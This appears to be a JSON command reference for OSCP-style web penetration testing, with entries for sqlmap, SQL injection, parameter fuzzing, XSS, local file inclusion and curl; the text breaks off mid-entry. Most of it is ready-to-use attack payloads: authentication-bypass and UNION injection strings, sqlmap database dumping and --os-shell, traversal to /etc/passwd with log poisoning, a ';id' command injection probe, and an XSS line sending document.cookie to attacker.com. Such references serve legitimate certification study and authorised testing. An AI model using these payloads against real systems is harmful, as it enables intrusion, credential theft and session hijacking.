    {
      "id": "sqlmap-basic",
      "name": "SQLMap Basic Scan",
      "category": "web",
      "command": "sqlmap -u '<URL>?<PARAM>=<VALUE>' --batch --banner",
      "description": "Automated SQL injection testing",
      "tags": [
        "AUTOMATED",
        "DATABASE",
        "ENUMERATION",
        "EXPLOITATION",
        "INJECTION",
        "NOISY",
        "OSCP:HIGH",
        "SQLI",
        "SQLMAP",
        "SQL_INJECTION",
        "WEB"
      ],
      "variables": [
        {
          "name": "<URL>",
          "description": "Target URL",
          "example": "http://192.168.1.100/page.php",
          "required": true
        },
        {
          "name": "<PARAM>",
          "description": "Parameter name",
          "example": "id",
          "required": true
        },
        {
          "name": "<VALUE>",
          "description": "Parameter value",
          "example": "1",
          "required": true
        }
      ],
      "flag_explanations": {
        "-u": "Target URL with parameter",
        "--batch": "Never ask for user input, use defaults",
        "--banner": "Retrieve DBMS banner to identify database type/version"
      },
      "success_indicators": [
        "Parameter:",
        "[INFO] the back-end DBMS is",
        "sqlmap identified the following injection point",
        "Type: boolean-based blind",
        "Type: time-based blind",
        "Type: UNION query"
      ],
      "failure_indicators": [
        "all tested parameters do not appear to be injectable",
        "[CRITICAL] no parameter(s) found",
        "connection timed out"
      ],
      "next_steps": [
        "Enumerate databases: sqlmap -u '<URL>' --dbs",
        "Dump specific database: sqlmap -u '<URL>' -D <DATABASE> --dump",
        "Get shell: sqlmap -u '<URL>' --os-shell",
        "Try different techniques: sqlmap -u '<URL>' --technique=U"
      ],
      "alternatives": [
        "sqlmap -r request.txt --batch",
        "manual SQLi testing",
        "burp suite scanner"
      ],
      "notes": "Save Burp request to file for complex requests",
      "oscp_relevance": "high"
    },
    {
      "id": "sqli-manual-test",
      "name": "Manual SQLi Test",
      "category": "web",
      "command": "' OR 1=1--",
      "description": "Basic SQL injection payload",
      "tags": [
        "DATABASE",
        "EXPLOITATION",
        "INJECTION",
        "MANUAL",
        "OSCP:HIGH",
        "QUICK_WIN",
        "SQLI",
        "SQL_INJECTION",
        "WEB"
      ],
      "variables": [],
      "flag_explanations": {
        "'": "SQL string delimiter to break out of query",
        "OR 1=1": "Always true condition to bypass authentication",
        "--": "SQL comment to ignore rest of query"
      },
      "success_indicators": [
        "Different response length",
        "All records returned",
        "Successful login",
        "SQL error message exposed"
      ],
      "failure_indicators": [
        "Same response as normal",
        "WAF detected",
        "Input filtered/escaped"
      ],
      "next_steps": [
        "Try UNION SELECT: ' UNION SELECT null,null,null--",
        "Extract database version: ' UNION SELECT @@version,null,null--",
        "Enumerate tables: ' UNION SELECT table_name,null FROM information_schema.tables--",
        "Use sqlmap for automation: sqlmap -u '<URL>?param=value'"
      ],
      "alternatives": [
        "' OR '1'='1",
        "\" OR \"1\"=\"1",
        "' OR 1=1#",
        "admin'--",
        "' OR 1=1 LIMIT 1--"
      ],
      "notes": "Try with both single and double quotes",
      "oscp_relevance": "high"
    },
    {
      "id": "wfuzz-params",
      "name": "Parameter Fuzzing",
      "category": "web",
      "command": "wfuzz -c -z file,<WORDLIST> --hc 404 '<URL>?FUZZ=test'",
      "description": "Discover hidden parameters",
      "tags": [
        "DIRECTORY_ENUMERATION",
        "DISCOVERY",
        "ENUM",
        "ENUMERATION",
        "FUZZ",
        "OSCP:MEDIUM",
        "WEB",
        "WFUZZ"
      ],
      "variables": [
        {
          "name": "<URL>",
          "description": "Target URL",
          "example": "http://192.168.1.100/page.php",
          "required": true
        },
        {
          "name": "<WORDLIST>",
          "description": "Parameter wordlist",
          "example": "/usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt",
          "required": true
        }
      ],
      "flag_explanations": {
        "-c": "Color output for better readability",
        "-z": "Payload source - 'file' for wordlist",
        "--hc": "Hide status codes (404 = not found)",
        "FUZZ": "Placeholder replaced by wordlist entries"
      },
      "success_indicators": [
        "C=200",
        "C=302",
        "different response length",
        "W!=0"
      ],
      "failure_indicators": [
        "0 Reqs/sec",
        "connection refused",
        "All responses filtered"
      ],
      "next_steps": [
        "Test found parameters for injection: <URL>?<PARAM>='",
        "Fuzz parameter values: wfuzz -z file,<WORDLIST> '<URL>?param=FUZZ'",
        "Check for IDOR: <URL>?<PARAM>=1,2,3...",
        "Test for command injection: <URL>?<PARAM>=;id"
      ],
      "alternatives": [
        "ffuf -u '<URL>?FUZZ=test' -w <WORDLIST>",
        "burp intruder",
        "param-miner"
      ],
      "notes": "Filter by response size or status code",
      "oscp_relevance": "medium"
    },
    {
      "id": "xss-test",
      "name": "XSS Basic Test",
      "category": "web",
      "command": "<script>alert(1)</script>",
      "description": "Basic XSS payload",
      "tags": [
        "CROSS_SITE_SCRIPTING",
        "EXPLOITATION",
        "MANUAL",
        "OSCP:MEDIUM",
        "WEB",
        "XSS"
      ],
      "variables": [],
      "flag_explanations": {
        "<script>": "HTML script tag for JavaScript execution",
        "alert(1)": "JavaScript function to trigger popup (proof of concept)",
        "</script>": "Closing script tag"
      },
      "success_indicators": [
        "Alert box appears",
        "Payload reflected unescaped in response",
        "<script> tags in page source",
        "JavaScript executed"
      ],
      "failure_indicators": [
        "Escaped output: &lt;script&gt;",
        "Filtered/removed",
        "Content Security Policy blocks"
      ],
      "next_steps": [
        "Try event handlers: <img src=x onerror=alert(1)>",
        "Bypass filters: <ScRiPt>alert(1)</ScRiPt>",
        "Steal cookies: <script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>",
        "Check stored XSS in forms/comments"
      ],
      "alternatives": [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "<body onload=alert(1)>"
      ],
      "notes": "Check if input is reflected in response",
      "oscp_relevance": "medium"
    },
    {
      "id": "lfi-test",
      "name": "LFI Basic Test",
      "category": "web",
      "command": "../../../../../../etc/passwd",
      "description": "Local file inclusion test",
      "tags": [
        "DIRECTORY_TRAVERSAL",
        "FILE_INCLUSION",
        "LFI",
        "MANUAL",
        "OSCP:HIGH",
        "WEB"
      ],
      "variables": [],
      "flag_explanations": {
        "../": "Directory traversal to move up directories",
        "etc/passwd": "Target file - Linux user database (always readable)"
      },
      "success_indicators": [
        "root:x:0:0",
        "daemon:x:",
        "/bin/bash",
        "www-data:"
      ],
      "failure_indicators": [
        "File not found",
        "Permission denied",
        "include(): Failed opening"
      ],
      "next_steps": [
        "Read web config: ../../../../var/www/html/config.php",
        "Get shell via log poisoning: ../../../var/log/apache2/access.log",
        "Windows LFI: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "PHP filter wrapper: php://filter/convert.base64-encode/resource=index.php"
      ],
      "alternatives": [
        "....//....//etc/passwd",
        "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%252e%252e%252f",
        "file:///etc/passwd"
      ],
      "notes": "Try with null byte (%00) termination",
      "oscp_relevance": "high"
    },
    {
      "id": "curl-post",
      "name": "cURL POST Request",
      "category": "web",
      "command": "curl -X POST -d '<PARAM>=<VALUE>' <URL>",
      "description": "Send POST request with data",
      "tags": [
        "CURL",
        "HTTP",
        "MANUAL",
        "WEB"
      ],
      "variables": [
        {
          "name": "<URL>",
          "description": "Target URL",
          "example": "http://192.168.1.100/login.php",
          "required": true
        },
        {
          "name": "<PARAM>",
          "description": "Parameter name",
          "example": "username",
          "required": true
        },
        {
          "name": "<VALUE>",
          "description": "Parameter value",
          "example": "admin",
          "required": true
        }
      ],
      "flag_explanations": {
        "-X": "HTTP method to use (POST, GET, PUT, DELETE)",
        "-d": "Data to send in POST request body",
        "-H": "Custom header (not shown but commonly used)"
      },
      "success_indicators": [
        "200 OK",
        "302 Found",
        "Set-Cookie:",
        "Login successful"
      ],
      "failure_indicators": [
        "Connection refused",
        "400 Bad Request",
        "500 Internal Server Error"
      ],
      "next_steps": [
        "Add headers: curl -X POST -H 'Content-Type: application/json' -d '{\"key\":\"value\"}' <URL>",
        "Save cookies: curl -c cookies.txt -X POST -d 'user=admin' <URL>",
        "Use cookies: curl -b cookies.txt <URL>",
        "Follow redirects: curl -L -X POST -d 'data' <URL>"
      ],
      "alternatives": [
        "wget --post-data '<PARAM>=<VALUE>' <URL>",
        "httpie POST <URL> param=value",
        "python requests.post()"
